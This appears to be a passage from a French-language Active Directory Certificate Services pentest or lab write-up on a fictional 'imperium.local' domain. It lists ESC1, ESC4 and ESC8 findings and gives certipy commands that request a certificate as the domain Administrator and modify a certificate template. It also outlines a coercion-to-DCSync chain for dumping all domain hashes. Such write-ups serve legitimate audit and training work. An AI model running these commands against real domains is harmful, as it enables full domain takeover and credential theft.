...
certipy template -u vladimir.harkonnen@imperium.local -p 'PASSWORD' \
  -template 'SpiceStorage' \
  -save-old \   # ← sauvegarde la config originale (IMPORTANT pour le rapport)
  -dc-ip 10.x.x.x
...
## 🔍 Analyse de imperium.local

### Vulnérabilités confirmées

#### 🔴 ESC1 — Template `InterstellarTransport`

- **Exploitable immédiatement** avec le compte `yueh.wellington` (Domain User)
- Donne accès au compte `Administrator` du domaine

```bash
certipy req -u yueh.wellington@imperium.local -p PASSWORD \
  -ca 'IMPERIUM-CA' -template 'InterstellarTransport' \
  -upn 'administrator@imperium.local' -dc-ip IP
certipy auth -pfx administrator.pfx -dc-ip IP
```

#### 🔴 ESC8 — CA `IMPERIUM-CA` sur `caladan.imperium.local`

- **Web Enrollment HTTP activé**, HTTPS désactivé
- Nécessite de coercer l'authentification du DC
- Résultat : cert du DC → DCSync → tous les hashes du domaine

#### 🟡 ESC4 — Template `SpiceStorage`

- `vladimir.harkonnen` a Full Control sur le template
- Si ce compte est compromis → modifier le template → ESC1

### Points d'attention supplémentaires

- Template `User` (schema v1) : marqué comme potentielle cible ESC2/ESC3
- Template `Machine` (schema v1) : idem, cible ESC2/ESC3 pour les machines

---

## 📖 Ressources

- [Certified Pre-Owned — SpecterOps (2021)](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [Certipy Wiki (ly4k)](https://github.com/ly4k/Certipy/wiki)
